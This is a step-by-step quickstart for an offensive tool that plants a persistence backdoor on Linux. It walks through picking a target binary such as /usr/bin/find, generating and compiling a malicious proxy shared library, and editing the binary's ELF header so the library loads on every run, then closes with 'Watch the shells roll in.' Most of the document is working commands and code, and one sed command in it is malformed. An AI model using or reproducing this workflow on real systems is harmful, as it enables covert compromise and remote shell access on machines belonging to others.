Quickstart
==========
A command-by-command, easy-button walkthrough.

1. Build the tool
-----------------
```bash
go get -u github.com/magisterquis/dynelfsymbols
GOOS=linux go build -o ./dynelfsymbols github.com/magisterquis/dynelfsymbols/dynelfsymbols
```
This should probably be done on the attack box, and not on target.  Move the
resulting binary to the target.

2. Find a good candidate for backdooring
----------------------------------------
Choose a directory with lots of potential.  Good binaries should link to a
library with only a few imported symbols and be called as often as the
malicious code should be run.  `/bin` is a good choice, as is `/usr/bin`.  If
there's custom software runnnig, wherever that is is a good choice, as well.

```
$ ./dynelfsymbols /usr/bin
File                                         Count  Libraries
----                                         -----  ---------
...snip...
/usr/bin/find                                1      libm.so.6
...snip
```
Here we get a list of ELF Files, as well as the library from which is imported
the fewest symbols and the number of symbols imported from that library.

`/bin/find` looks good.  It only imports one function from `libm`, and there
isn't likely to be side-effects since `libm` is a math library.

3. Find the library to backdoor
-------------------------------
Now that we've got a nice binary in mind, look at the symbols it imports from
each library to which it links.
```bash
$ ./dynelfsymbols /usr/bin/find
Library    Symbol                  Version
-------    ------                  -------
libm.so.6  modf                    GLIBC_2.2.5
...snip...
```
The function `modf` (with version `GLIBC_2.2.5`) is the only symbol imported
from `libm.so.6`.  Sometimes the same number of symbols are imported from
multiple libraries, in which case it's probably best to choose the one least
likely to be used or the one for which documentation is easiest to find.

4. Generate malicious library source
------------------------------------
Now that we've got the real library to replace (`libm.so.6`), we need to
generate our own malicious library.  We'll choose the name `libM` as that's
likely to not be too conspicuous.

```bash
./dynelfsymbols -c libm.so.6 /usr/bin/find > libM.c
```
There is a small file that needs to be made to give the right version strings
to the exported functions.  This is in a comment in the source code and should
be extracted.

```bash
perl -ne 'print$1if/^VERSIONSCRIPT (.*)/s' ./libM.c > ./vs
```

Take a moment to read through the generated source.

5. Fill in function definitions
-------------------------------
Before the malicious library can be built, the prototypes and definitions of
the exported functions need to have return types and arguments added.

The following lines of the C source need to be changed
```c
/* Exported function prototypes */
TYPE_CHANGEME modf(ARGS_CHANGEME);

/* Pointers to real functions */
static TYPE_CHANGEME (*modf_real)(ARGS_CHANGEME) = NULL;

/* Exported functions which call real functions */
TYPE_CHANGEME modf(ARGS_CHANGEME) {return modf_real(ARGS_CHANGEME);}
```

Types and arguments for the functions are typically in a manpage or a quick
Google search away.  In this case `man modf` gives us what we need to know.

After changing the prototypes and definitions, we get
```c
/* Exported function prototypes */
double modf(double x, double *iptr);

/* Pointers to real functions */
static double (*modf_real)(double x, double *iptr) = NULL;

/* Exported functions which call real functions */
double modf(double x, double *iptr) {return modf_real(x, iptr);}
```

After changing the necessary bits, code should be added to the contstructor
function `con` or another appropriate place in the library to do something
devious.  One possibility is intercepting a function like `accept(4)` to spawn
a shell if the remote end has the right address.  This is left as an exercise
for the reader.

6. Build library
----------------
At the bottom of the source is a generic command which can be used to build
the library.  The filenames will need to be changed, of course.
```bash
cc -O2 -shared -fPIC -Wl,--version-script=vs -o libM.so.6 libM.c -ldl
```
If all goes well, no output will be printed.

7. Backdoor binary
------------------
Put the library somewhere predictable, like `/lib`.

Edit the binary to replace `libm.so.6` in the elf header with `libM.so.6`.  It
should be near the top of the file, nearby other library and function names.

In vim, this looks like changing
```plaintext
...snip...
@libselinux.so.1^@_ITM_deregisterTMCloneTable^@__gmon_start__^@_Jv_RegisterClas
ses^@_ITM_registerTMCloneTable^@_init^@is_selinux_enabled^@fgetfilecon^@freecon
^@lgetfilecon^@lsetfilecon^@_fini^@libm.so.6^@modf^@libc.so.6^@__stpcpy_chk^@ff
lush^@strcpy^@__printf_chk^@re_set_syntax^@fnmatch^@readdir^@sprintf^@_IO_putc^
@setlocale^@mbrtowc^@fopen^@strncmp^@strrchr^@re_match^@readlinkat^@__strdup^@r
...snip...
```
to
```plaintext
...snip...
@libselinux.so.1^@_ITM_deregisterTMCloneTable^@__gmon_start__^@_Jv_RegisterClas
ses^@_ITM_registerTMCloneTable^@_init^@is_selinux_enabled^@fgetfilecon^@freecon
^@lgetfilecon^@lsetfilecon^@_fini^@libM.so.6^@modf^@libc.so.6^@__stpcpy_chk^@ff
lush^@strcpy^@__printf_chk^@re_set_syntax^@fnmatch^@readdir^@sprintf^@_IO_putc^
@setlocale^@mbrtowc^@fopen^@strncmp^@strrchr^@re_match^@readlinkat^@__strdup^@r
...snip...
```

It should also be possible to use sed to do the same thing, but there is the
risk that the wrong string will be changed.
```bash
sed -i '/libm\.so\.6/libM\.so\.6'
```

8.  That's it!
--------------
Now, any time someone calls `find(1)`, whatever malicious code you added to
`libM` will be run.  Watch the shells roll in.
